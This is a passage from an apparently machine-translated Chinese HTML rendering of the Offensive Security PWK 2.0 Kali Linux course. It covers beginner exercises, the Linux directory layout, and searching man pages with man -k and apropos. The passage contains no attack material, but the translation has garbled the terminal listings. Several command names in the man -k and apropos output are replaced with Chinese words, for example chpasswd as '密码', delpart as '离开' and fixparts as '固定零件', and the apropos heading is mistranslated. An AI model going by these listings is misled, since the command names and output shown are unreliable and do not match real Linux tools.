<div style="position:absolute;top:42755;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">31 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2019 年），https://tools.kali.org</font></font></font></nobr></div>
<div style="position:absolute;top:42775;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">32 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2019 年），https://bugs.kali.org</font></font></font></nobr></div>
<div style="position:absolute;top:42795;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">33 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2019 年），https://kali.training</font></font></font></nobr></div>
<div style="position:absolute;top:42815;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">34 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2019 年），https://kali.training</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:42943;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="37"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 37 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:42976;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:44053;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:44053;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:44053;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">37</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:43072;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">练习以测试您对材料的了解、支持论坛等。</font><font style="vertical-align: inherit;">本网站包括一个</font></font></nobr></div>
<div style="position:absolute;top:43091;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">丰富的有用信息可帮助用户更好地熟悉 Kali Linux。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:43126;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.3.6 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:43164;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（这些练习不需要报告）</font></font></i></nobr></div>
<div style="position:absolute;top:43196;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 启动您的 Kali 操作系统并将 kali 用户密码更改为安全的内容。</font></font></nobr></div>
<div style="position:absolute;top:43225;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 花一些时间熟悉 Kali Linux 菜单。</font></font></nobr></div>
<div style="position:absolute;top:43253;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 使用 Kali Tools 站点，找到您喜欢的工具并查看其文档。</font><font style="vertical-align: inherit;">如果你不</font></font></nobr></div>
<div style="position:absolute;top:43272;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有一个最喜欢的工具，选择任何工具。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:43310;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.4 在 Kali 中寻找出路</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:43353;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.4.1 Linux 文件系统</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:43391;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali Linux 遵循文件系统层次结构标准 (FHS)，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">35</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提供了一个熟悉的和</font></font></nobr></div>
<div style="position:absolute;top:43410;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适用于所有 Linux 用户的通用布局。</font><font style="vertical-align: inherit;">您会发现最有用的目录是：</font></font></nobr></div>
<div style="position:absolute;top:43443;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:43443;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/bin - 基本程序（ls、cd、cat 等）</font></font></nobr></div>
<div style="position:absolute;top:43471;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:43471;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/sbin - 系统程序（fdisk、mkfs、sysctl 等）</font></font></nobr></div>
<div style="position:absolute;top:43500;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:43500;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/etc - 配置文件</font></font></nobr></div>
<div style="position:absolute;top:43528;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:43528;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/tmp - 临时文件（通常在启动时删除）</font></font></nobr></div>
<div style="position:absolute;top:43556;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:43556;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/bin - 应用程序（apt、ncat、nmap 等）</font></font></nobr></div>
<div style="position:absolute;top:43585;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">•</font></font></nobr></div>
<div style="position:absolute;top:43585;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/share - 应用程序支持和数据文件</font></font></nobr></div>
<div style="position:absolute;top:43618;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">还有许多其他目录，其中大部分您很少需要进入，但是有一个很好的</font></font></nobr></div>
<div style="position:absolute;top:43637;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">熟悉 Linux 文件系统的布局将极大地帮助您提高效率。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:43671;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.4.2 Linux 基本命令</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:43711;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.4.2.1 手册页</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:43746;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，让我们深入了解 Kali Linux 的用法并探索一些基本的 Linux 命令。</font></font></nobr></div>
<div style="position:absolute;top:43778;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">大多数用于 Linux 命令行的可执行程序都提供了一个正式的</font></font></nobr></div>
<div style="position:absolute;top:43798;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文档通常称为手册或</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">手册</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">页。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">36</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一个叫做</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">man</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的特殊程序</font><font style="vertical-align: inherit;">用于查看</font></font></nobr></div>
<div style="position:absolute;top:43817;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些页面。</font><font style="vertical-align: inherit;">手册页通常有名称、概要、命令的描述</font></font></nobr></div>
<div style="position:absolute;top:43836;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目的，以及相应的选项、参数或开关。</font><font style="vertical-align: inherit;">让我们看看手册页</font></font></nobr></div>
<div style="position:absolute;top:43856;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LS</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:43891;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">man ls</font></font></font></b></nobr></div>
<div style="position:absolute;top:43910;left:304"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 3 - 浏览 ls 命令的手册页</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:43983;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">35 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Linux 基金会，2016 年），https://wiki.linuxfoundation.org/lsb/fhs</font></font></font></nobr></div>
<div style="position:absolute;top:44003;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">36 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Man_page</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:44131;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="38"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 38 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:44164;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:45241;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:45241;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:45241;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">38</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:44260;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">手册页不仅包含有关用户命令的信息，还包含有关</font></font></nobr></div>
<div style="position:absolute;top:44279;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统管理命令、编程接口等。</font><font style="vertical-align: inherit;">手册内容</font></font></nobr></div>
<div style="position:absolute;top:44298;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分为几个部分，编号如下：</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:44332;left:246"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">部分</font></font></nobr></div>
<div style="position:absolute;top:44332;left:462"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内容</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:44354;left:272"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1</font></font></nobr></div>
<div style="position:absolute;top:44354;left:437"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户命令</font></font></nobr></div>
<div style="position:absolute;top:44374;left:272"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2</font></font></nobr></div>
<div style="position:absolute;top:44374;left:325"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内核系统调用的编程接口</font></font></nobr></div>
<div style="position:absolute;top:44394;left:272"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3</font></font></nobr></div>
<div style="position:absolute;top:44394;left:354"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C 库的编程接口</font></font></nobr></div>
<div style="position:absolute;top:44414;left:272"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4</font></font></nobr></div>
<div style="position:absolute;top:44414;left:330"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">特殊文件，例如设备节点和驱动程序</font></font></nobr></div>
<div style="position:absolute;top:44434;left:272"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5</font></font></nobr></div>
<div style="position:absolute;top:44434;left:454"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件格式</font></font></nobr></div>
<div style="position:absolute;top:44454;left:272"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6</font></font></nobr></div>
<div style="position:absolute;top:44454;left:323"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">游戏和娱乐，例如屏幕保护程序</font></font></nobr></div>
<div style="position:absolute;top:44474;left:272"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7</font></font></nobr></div>
<div style="position:absolute;top:44474;left:445"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">各种各样的</font></font></nobr></div>
<div style="position:absolute;top:44495;left:272"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8</font></font></nobr></div>
<div style="position:absolute;top:44495;left:372"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">系统管理命令</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:44514;left:367"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">表 2 - 手册页组织</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:44544;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要确定适当的手册部分，只需执行关键字搜索。</font><font style="vertical-align: inherit;">例如，让我们</font></font></nobr></div>
<div style="position:absolute;top:44563;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">假设我们有兴趣了解更多关于 /etc/passwd 文件的文件格式。</font><font style="vertical-align: inherit;">打字</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:44583;left:109"><nobr><b><font style="vertical-align: inherit;"></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令行中的</font></font></font><font style="vertical-align: inherit;"><b><font style="vertical-align: inherit;">man passwd</font></b><font style="font-size:14px"><font style="vertical-align: inherit;">将显示有关</font></font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">passwd</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令的信息</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:44602;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">手册的第 1 部分（图 4），这不是我们感兴趣的。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:45104;left:296"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 4：请求手动输入 passwd 文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:45135;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是，如果我们将</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-k</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项与</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">man 一起使用</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，我们可以执行如下所示的关键字搜索：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:45170;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">man -k passwd</font></font></font></b></nobr></div>
<div style="position:absolute;top:45187;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">chgpasswd (8)    </font></font></nobr></div>
<div style="position:absolute;top:45187;left:279"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- 批量更新组密码 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:45319;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="39"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 39 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:45352;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:46429;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:46429;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:46429;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">39</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:45448;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码 (8)    </font></font></nobr></div>
<div style="position:absolute;top:45448;left:279"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- 以批处理模式更新密码</font></font></nobr></div>
<div style="position:absolute;top:45464;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">exim4_passwd (5) - Debian exim4 软件包使用的文件</font></font></nobr></div>
<div style="position:absolute;top:45481;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">exim4_passwd_client (5) - Debian exim4 软件包使用的文件</font></font></nobr></div>
<div style="position:absolute;top:45498;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">expect_mkpasswd (1) - 生成新密码，可选择将其应用于用户</font></font></nobr></div>
<div style="position:absolute;top:45516;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">fgetpwent_r (3) - 可重入获取 passwd 文件条目</font></font></nobr></div>
<div style="position:absolute;top:45532;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">getpwent_r (3) - 可重入获取 passwd 文件条目</font></font></nobr></div>
<div style="position:absolute;top:45549;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">gpasswd (1)    </font></font></nobr></div>
<div style="position:absolute;top:45549;left:279"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- 管理 /etc/group 和 /etc/gshadow</font></font></nobr></div>
<div style="position:absolute;top:45566;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grub-mkpasswd-pbkdf2 (1) - 为 GRUB 生成散列密码</font></font></nobr></div>
<div style="position:absolute;top:45583;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">htpasswd (1)    </font></font></nobr></div>
<div style="position:absolute;top:45583;left:279"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- 管理用户文件以进行基本身份验证</font></font></nobr></div>
<div style="position:absolute;top:45600;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:45620;left:293"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 4 - 使用 man 执行 passwd 关键字搜索</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:45649;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以借助正则表达式进一步缩小搜索范围：</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">37</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:45684;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">man -k '^passwd$'</font></font></font></b></nobr></div>
<div style="position:absolute;top:45701;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码 (1)    </font></font></nobr></div>
<div style="position:absolute;top:45701;left:279"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- 更改用户密码</font></font></nobr></div>
<div style="position:absolute;top:45718;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码 (1ssl)    </font></font></nobr></div>
<div style="position:absolute;top:45718;left:279"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- 计算密码哈希</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:45735;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码 (5)    </font></font></b></nobr></div>
<div style="position:absolute;top:45735;left:279"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- 密码文件</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:45754;left:350"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 5 - 缩小搜索范围</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:45783;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在上面的命令中，正则表达式用插入符号 (^) 和美元符号 ($) 括起来，以</font></font></nobr></div>
<div style="position:absolute;top:45803;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">匹配整行并避免子字符串匹配。</font><font style="vertical-align: inherit;">我们现在可以查看确切的密码手册</font></font></nobr></div>
<div style="position:absolute;top:45822;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过引用适当的部分，我们感兴趣的页面：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:45857;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">man 5 passwd</font></font></font></b></nobr></div>
<div style="position:absolute;top:45876;left:232"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 6 - 使用 man 查看 /etc/passwd 文件格式的手册页</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:45906;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">手册页通常是查找给定命令文档的最快方式，因此请参考</font></font></nobr></div>
<div style="position:absolute;top:45925;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一些时间来更详细地探索它们。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:45959;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.4.2.2 恰到好处</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:45994;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">apropos </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">38</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令，我们可以在手册页描述列表中搜索可能的匹配项</font></font></nobr></div>
<div style="position:absolute;top:46013;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于关键字。</font><font style="vertical-align: inherit;">虽然这有点粗糙，但它通常有助于查找特定命令</font></font></nobr></div>
<div style="position:absolute;top:46033;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据描述。</font><font style="vertical-align: inherit;">让我们看一个例子。</font><font style="vertical-align: inherit;">假设我们要对一个硬分区</font></font></nobr></div>
<div style="position:absolute;top:46052;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">驱动器，但不记得命令的名称。</font><font style="vertical-align: inherit;">我们可以通过</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">适当的</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索</font><font style="vertical-align: inherit;">来解决这个问题</font></font></nobr></div>
<div style="position:absolute;top:46072;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为“分区”。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:46106;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">apropos partition</font></font></font></b></nobr></div>
<div style="position:absolute;top:46123;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">添加部分 (8)    </font></font></nobr></div>
<div style="position:absolute;top:46123;left:279"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- 告诉内核一个分区的存在</font></font></nobr></div>
<div style="position:absolute;top:46141;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cfdisk (8)    </font></font></nobr></div>
<div style="position:absolute;top:46141;left:279"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- 显示或操作磁盘分区表</font></font></nobr></div>
<div style="position:absolute;top:46157;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cgdisk (8)    </font></font></nobr></div>
<div style="position:absolute;top:46157;left:279"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- 基于 Curses 的 GUID 分区表 (GPT) 操纵器</font></font></nobr></div>
<div style="position:absolute;top:46174;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cgpt (1)    </font></font></nobr></div>
<div style="position:absolute;top:46174;left:279"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- 使用 Chromium OS 操作 GPT 分区的实用程序...</font></font></nobr></div>
<div style="position:absolute;top:46191;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">离开 (8)    </font></font></nobr></div>
<div style="position:absolute;top:46191;left:279"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- 告诉内核忘记分区</font></font></nobr></div>
<div style="position:absolute;top:46208;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">extundelete (1) - 从 ext3 或 ext4 分区取消删除文件的实用程序。</font></font></nobr></div>
<div style="position:absolute;top:46225;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">磁盘 (8)    </font></font></nobr></div>
<div style="position:absolute;top:46225;left:279"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- 操作磁盘分区表</font></font></nobr></div>
<div style="position:absolute;top:46242;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">固定零件 (8)    </font></font></nobr></div>
<div style="position:absolute;top:46242;left:279"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- MBR 分区表修复实用程序</font></font></nobr></div>
<div style="position:absolute;top:46259;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">磁盘 (8)    </font></font></nobr></div>
<div style="position:absolute;top:46259;left:279"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- 交互式 GUID 分区表 (GPT) 操作器</font></font></nobr></div>
